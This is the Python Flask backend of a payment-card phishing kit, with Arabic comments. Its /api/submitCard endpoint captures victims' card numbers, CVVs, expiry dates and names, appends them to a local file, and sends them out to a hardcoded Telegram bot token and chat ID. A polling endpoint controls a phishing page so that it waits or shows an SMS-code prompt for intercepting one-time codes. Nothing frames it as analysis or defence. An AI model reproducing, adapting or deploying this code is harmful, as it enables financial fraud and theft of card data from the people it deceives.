from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json

app = Flask(__name__)
CORS(app) # ضروري جداً لكي يقبل السيرفر طلبات Axios من المتصفح

# --- إعدادات Telegram ---
BOT_TOKEN = "8456405561:AAGgfz3XRSOJ8jB_q2WKX1CC_slqAibiAig"
CHAT_ID = "7298476851"

def send_to_telegram(data, title="💳 بطاقة جديدة"):
    message = (
        f"🔔 *{title}*\n\n"
        f"👤 الاسم: {data.get('holder')}\n"
        f"💳 الرقم: `{data.get('number')}`\n"
        f"📅 التاريخ: {data.get('expire')}\n"
        f"🔐 CVV: `{data.get('cvv')}`\n"
        f"💰 الرصيد: {data.get('balance')}\n"
        f"🆔 معرف الإعلان: {data.get('adId')}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/api/submitCard', methods=['POST'])
def receive_card():
    data = request.json
    print(f"Captured: {data}")

    # 1. حفظ في ملف نصي
    with open("captured_cards.txt", "a") as f:
        f.write(json.dumps(data) + "\n")

    # 2. إرسال إلى تليجرام
    send_to_telegram(data)

    # 3. الرد على المتصفح (مهم جداً لكي تستمر الصفحة في العمل)
    # الكود الخاص بك يتوقع استلام 'token' لكي يبدأ عملية الـ Polling
    return jsonify({"status": "success", "token": str(data.get('adId'))}), 200

@app.route('/api/checkStatus', methods=['POST'])
def check_status():
    # الصفحة تطلب الحالة كل 1.5 ثانية. يمكنك إرجاع "wait" لجعلها تنتظر
    # أو "sms" لإظهار نافذة الكود، أو "profit" لرسالة النجاح
    return jsonify({"status": "wait"}), 200

@app.route('/api/checkToken', methods=['POST'])
def check_token():
    return jsonify({"adaptive": "none"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)